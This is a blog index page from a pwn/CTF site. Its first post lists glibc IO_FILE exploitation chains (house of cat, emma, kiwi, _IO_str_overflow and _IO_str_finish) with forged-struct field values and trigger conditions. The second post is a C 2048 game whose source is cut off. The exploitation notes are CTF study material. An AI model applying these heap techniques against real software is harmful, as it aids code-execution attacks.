<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/02/IO_FILE%20%E5%B8%B8%E7%94%A8%E8%B0%83%E7%94%A8%E9%93%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/02/IO_FILE%20%E5%B8%B8%E7%94%A8%E8%B0%83%E7%94%A8%E9%93%BE/" class="post-title-link" itemprop="url">IO_FILE 常用调用链（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-02 16:21:36 / Modified: 16:23:14" itemprop="dateCreated datePublished" datetime="2022-09-02T16:21:36+08:00">2022-09-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>house of cat</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; [_IO_wfile_seekoff] (IO_wfile_jumps)</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wfile_jumps+0x10</li>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>house of emma</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; [_IO_cookie_write](IO_wfile_jumps)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fc235f79a20</span> &lt;_IO_cookie_write+<span class="number">48</span>&gt;    call   rax                           &lt;getkeyserv_handle+<span class="number">528</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x562b7f47baf0</span> ◂— <span class="number">0x0</span> <span class="comment">/* __cookie:可控heap */</span></span><br><span class="line">       rsi: <span class="number">0x7fc2360bb360</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span>    </span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wfile_jumps+0x40</li>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>house of kiwi</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; fflush -&gt; sync(_IO_file_jumps)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e78523</span> &lt;fflush+<span class="number">131</span>&gt;    call   qword ptr [rbp + <span class="number">0x60</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x7ffff7fc35e0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">       rsi: <span class="number">0xc00</span></span><br><span class="line">       rdx: <span class="number">0x7ffff7fc38c0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x7ffff7ef2417</span> (write+<span class="number">23</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>修改 top chunk -&gt; P = 0，使 top chunk 不够分配</li>
</ul>
<p><strong>IO_flush_all</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all -&gt; _IO_flush_all_lockp -&gt; [_IO_wdefault_xsgetn](IO_wstrn_jumps) -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>伪造 vtable = IO_wstrn_jumps+0x28</li>
<li>手动调用 <code>_IO_flush_all</code></li>
</ul>
<p><strong>_IO_str_jumps -&gt; _IO_str_overflow</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_str_overflow</span><br><span class="line">__run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_str_overflow</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>libc-2.27.so</code> 及之前，程序在 <code>_IO_str_overflow</code> 里可以通过 <code>call qword ptr [rbx + 0xe0]</code> 来执行指定的函数</li>
<li>在 <code>libc-2.29.so</code> 及之后，程序在 <code>__GI__IO_str_overflow</code> 里不再使用上面的指令，而是调用 <code>call malloc@plt</code> ，所以要在 <code>&amp;_IO_list_all.vtable+8</code> 处写入将要执行的函数</li>
</ul>
<p>伪造条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = addr_rdx</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_buf_end = (addr_rdi - <span class="number">100</span>) / <span class="number">2</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">vtable = addr_IO_str_jumps</span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>破坏 unsortedbin</li>
<li>执行 exit</li>
</ul>
<p><strong>_IO_str_jumps -&gt; _IO_str_finish</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; [_IO_str_finish]</span><br><span class="line">__run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; [_IO_str_finish]</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>libc-2.27.so</code> 及之前，程序在 <code>_IO_str_finish</code> 里可以通过 <code>call qword ptr [rbx + 0xe8]</code> 来执行指定的函数</li>
<li>在 <code>libc-2.29.so</code> 及之后，程序在 <code>_IO_str_finish</code> 里不再使用上面的指令，而是调用 <code>call free@plt</code> ，所以要在 <code>&amp;_IO_list_all.vtable+0x10</code> 处写入将要执行的函数</li>
</ul>
<p>伪造条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base = addr_rdi <span class="comment">// 也就是 fp-&gt;_IO_write_end</span></span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">vtable = addr_IO_str_jumps - <span class="number">8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>触发条件：</p>
<ul>
<li>破坏 unsortedbin</li>
<li>执行 exit</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/31/C%E8%AF%AD%E8%A8%80%E7%89%882048/" class="post-title-link" itemprop="url">不务正业系列：C语言版2048</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-31 15:02:38 / Modified: 15:13:43" itemprop="dateCreated datePublished" datetime="2022-08-31T15:02:38+08:00">2022-08-31</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>C语言版2048</strong></p>
<p>之前我复现了 Actf 的 2048，感觉这个游戏挺有意思（玩的有点上头），于是逆了逆源码，仿照他的思路也写了一个</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">old_config</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">new_config</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *str_list[<span class="number">12</span>]=&#123;</span><br><span class="line">	<span class="string">&quot;39&quot;</span>,</span><br><span class="line">	<span class="string">&quot;31&quot;</span>,</span><br><span class="line">	<span class="string">&quot;32&quot;</span>,</span><br><span class="line">	<span class="string">&quot;33&quot;</span>,</span><br><span class="line">	<span class="string">&quot;34&quot;</span>,</span><br><span class="line">	<span class="string">&quot;35&quot;</span>,</span><br><span class="line">	<span class="string">&quot;36&quot;</span>,</span><br><span class="line">	<span class="string">&quot;37&quot;</span>,</span><br><span class="line">	<span class="string">&quot;91&quot;</span>,</span><br><span class="line">	<span class="string">&quot;92&quot;</span>,</span><br><span class="line">	<span class="string">&quot;93&quot;</span>,</span><br><span class="line">	<span class="string">&quot;94&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> score;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> extra;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> box[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span> num[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">size_t</span> key[<span class="number">12</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x100</span>,<span class="number">0x200</span>,<span class="number">0x400</span>,<span class="number">0x800</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> win;</span><br><span class="line"><span class="keyword">int</span> lose;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">table_show</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\x1B[2J\x1B[HScore: %ld&quot;</span>, score);</span><br><span class="line">	<span class="keyword">if</span>(extra)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; (+%ld)&quot;</span>,extra);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;+------+------+------+------+&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][j])&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\x1B[7m\x1B[%sm%*s \x1B[0m|&quot;</span>, str_list[box[i][j]], <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%*s |&quot;</span>, <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;=<span class="number">3</span>;k++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (box[i][k])&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\x1B[7m\x1B[%sm%*zd \x1B[0m|&quot;</span>, str_list[box[i][k]], <span class="number">5</span>, key[box[i][k]]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%*s |&quot;</span>, <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;=<span class="number">3</span>;m++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(box[i][m])&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\x1B[7m\x1B[%sm%*s \x1B[0m|&quot;</span>, str_list[box[i][m]], <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%*s |&quot;</span>, <span class="number">5</span>, num);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">&quot;+------+------+------+------+&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">check_repeat</span><span class="params">(<span class="keyword">int</span> 